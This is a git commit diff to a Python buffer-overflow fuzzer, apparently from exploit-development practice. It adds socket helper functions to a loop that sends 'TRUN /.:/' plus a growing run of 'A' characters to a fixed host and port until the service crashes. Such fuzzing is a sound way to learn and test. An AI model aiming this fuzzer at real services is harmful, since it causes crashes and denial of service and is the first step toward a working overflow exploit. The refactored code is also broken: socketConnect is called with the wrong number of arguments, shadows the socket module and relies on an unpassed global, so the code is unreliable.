f93b7de1e921632df1295c46baac0731a40b9009
Netsune <jbancroft190@gmail.com>
2023-06-18 19:12:38 +1200

    socket creation and connection functions created with error reporting

--- OverBuff.py
+++ OverBuff.py
@@ -8,12 +8,33 @@ buffer = "A"
 max_buffer = 10000
 increment = 200
 counter = 100
+ip = '192.168.0.1' #IP must be in a string for the socket connection
+port = 9999 #port must be an int for the socket connection
 
-s = so.socket(so.AF_INET,so.SOCK_STREAM)
+def socketCreate():
+    try:
+        s = so.socket(so.AF_INET,so.SOCK_STREAM)
+    except so.error as e:
+        print("[!] - error creating socket: %s" % e)
+        sys.exit(1)
+    return s
+
+def socketConnect(so, ip, port):
+    try:
+        s.connect((ip, port))
+    except so.gaierror as e:
+        print("[!] - address related error connecting to socket %s" % e)
+        sys.exit(1)
+    except so.error as e:
+        print("[!] - error connecting to "+str(ip)+", make sure target is listening on port "+str(port)+"\n [-] - connection error: %s" % e)
+        sys.exit(1)
+        
+
+s = socketCreate()
 
 while len(buffer) < max_buffer:
     try:
-        s.connect(('192.168.0.1',9999))
+        socketConnect(ip, port)
         s.send(('TRUN /.:/' + buffer))
         s.close()
         sleep(1)
@@ -21,8 +42,8 @@ while len(buffer) < max_buffer:
 
     except:
         print("[+] Fuzzing crashed at %s bytes" % str(len(buffer)))
-        sys.exit()
+        sys.exit(0)
 
 print("[!] Buffer limit exceeded, fuzzing failed.")
-sys.exit()
+sys.exit(0)
         
